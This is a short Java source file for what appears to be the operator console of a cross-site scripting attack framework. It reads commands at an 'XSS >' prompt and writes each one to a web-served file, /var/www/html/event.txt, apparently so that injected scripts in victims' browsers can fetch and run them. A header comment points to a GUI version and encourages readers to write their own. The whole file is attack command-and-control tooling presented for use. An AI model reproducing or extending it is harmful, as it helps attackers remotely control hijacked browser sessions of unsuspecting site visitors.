/*
 
OLD handler application.
I strongly reccomend to use the GUI tool (Java_XSS.java).
If time permits I will add a CLI only implementation of this system later.
But, feel free to code your own.
 
 
 
 
 
 
 */

import java.io.IOException;
import java.io.Console;
import java.nio.file.Files;
import java.nio.file.Paths;

public class xss {
	public static void main(String[] args) throws IOException, InterruptedException {
		Console std = System.console();
		String empty = "";
		while(true) {
		String command = std.readLine("XSS > ");
		Files.write(Paths.get("/var/www/html/event.txt"), command.getBytes());
		System.out.println("Executing...");
		Thread.sleep(7500);
		System.out.println("done");
		Files.write(Paths.get("/var/www/html/event.txt"), empty.getBytes());
		}
	}
}
